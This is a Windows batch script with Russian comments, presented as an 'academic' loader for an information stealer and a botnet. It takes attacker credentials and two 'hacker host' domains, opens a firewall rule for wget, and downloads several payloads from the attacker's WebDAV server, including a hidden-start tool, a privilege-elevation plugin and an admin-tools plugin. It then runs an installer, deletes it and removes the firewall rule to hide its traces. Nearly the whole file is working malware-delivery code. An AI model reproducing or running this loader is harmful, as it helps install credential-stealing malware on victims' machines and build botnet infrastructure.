rem Файл загрузки и установки стайлера (Академический вариант)
rem USAGE
rem > load_distrib.bat <username> <password> <hacker host server 1 domain> <hacker host server 2 domain>
rem Запускать файл с правами администратора

rem Инициализируем переменные окружения скрипта

SetLocal EnableExtensions EnableDelayedExpansion

set curdir=%CD%
rem создаём системные переменные Windows для ботнета
set Hacker_User=%1
set Hacker_Pass=%2
set Hacker_host1=%3
set Hacker_host2=%4

rem Go to Temprorary Directory
cd /d %curdir%

rem Настраиваем переменные окружения для команды Wget

rem Разрешаем все протоколы для wget.exe в брандмауэре
netsh advfirewall firewall add rule name="WGET.EXE Application" dir=in action=allow program="%curdir%\wget.exe" enable=yes

rem Определяем переменные:

rem Основная папка
set Mainfolder=Exponenta
rem Префикс протокола
set pref=http
rem HTTP Port
set port=80

rem HTTP WebDAV Host
set host=%pref%://%Hacker_host2%:%port%/%MainFolder%
rem WebDAV User
set user=%Hacker_User%
rem WebDAV Password
set password=%Hacker_Pass%
rem Локальный каталог
set LocalFolder=%PUB1%\Util
 
rem Запускаем на выполнение команды WGET

wget --http-user=%user% -nc --http-passwd=%password% %host%/ExponentaHTTPStylerMainFiles151SetupRePack.exe
wget --http-user=%user% -nc --http-passwd=%password% %host%/choc_pack.install.cmd
wget --http-user=%user% -nc --http-passwd=%password% %host%/Install_MainExponenta.bat
wget --http-user=%user% -nc --http-passwd=%password% %host%/HiddenStartRePack.exe
wget --http-user=%user% -nc --http-passwd=%password% %host%/ElevationExponentaPlugin202SetupRepack.exe
wget --http-user=%user% -nc --http-passwd=%password% %host%/duck-install.msi
wget --http-user=%user% -nc --http-passwd=%password% %host%/AdminTExponentaPlugin052Setup.exe
wget --http-user=%user% -nc --http-passwd=%password% %host%/chock.install.cmd


rem Запускаем инсталлятор стайлера "Экспонента"
call Install_MainExponenta.bat %Hacker_User% %Hacker_Pass% %Hacker_host1% %Hacker_host2%
cd /d %curdir%
del /F /S /Q /A Install_MainExponenta.bat

rem Удаляем правило для wget.exe в брандмауэре
netsh advfirewall firewall delete rule name="WGET.EXE Application"


